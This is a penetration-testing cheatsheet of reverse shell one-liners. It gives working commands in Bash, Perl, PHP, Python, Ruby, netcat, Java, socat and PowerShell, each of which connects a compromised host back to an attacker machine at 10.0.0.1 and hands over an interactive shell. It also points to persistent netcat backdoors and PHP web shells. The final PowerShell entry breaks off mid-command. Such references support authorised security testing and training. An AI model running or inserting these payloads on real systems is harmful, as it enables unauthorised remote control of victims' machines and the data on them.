# Reverse Shell Cheatsheet

When penetration testing, hackers often find themselves in a  compromised system with a command execution vulnerability. Whenever the  opportunity persists, the attacker must establish a reverse shell.

A **reverse shell** is an (insecure) shell session which establishes a connection initiated by a remote host. This is a **type** of shell where the attacker may communicate back to the remote host.

The attacking machine essentially acts as a client whilst the remote  host acts as the server, creating a communication port on the victim.  Once this connection has been established, the attacker can remotely  execute commands.

The attacking machine listens on a port which the connection is established on.

This article will outline the most common reverse shells that can be  used. Depending on what is available on the target system, one of the  following scripting languages must be chosen.

Please refer to the bottom of this page for web shells in Kali Linux.

### Bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP

Please note, this assumes a TCP connection uses file descriptor 3.

```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' 
```

If a .php file is needed for a payload, refer to [this website](https://github.com/pentestmonkey/php-reverse-shell) for some examples. You can also find some in the web shells directory on Kali Linux.

### Python

Python 2.7

```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Refer to [this website](https://www.thepythoncode.com/article/create-reverse-shell-python) for more information about python reverse shells.

### Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

If an attacker is lucky enough to find netcat on the compromised  system, Netcat can be used to gain a reverse shell. If possible,  installing the windows binary nc.exe can allow an attacker a persistent  netcat backdoor. Read more about [this here](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/).

```
nc -e /bin/sh 10.0.0.1 1234
```

If the incorrect version of netcat is installed, this command may be used to get a reverse shell. Please refer to [this website for more information](https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498).

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Socat

Attacker:

```
socat file:`tty`,raw,echo=0 TCP-L:port
```

Client:

```
/dev/shm exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip-address:port
```

### Powershell

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ip-address
```
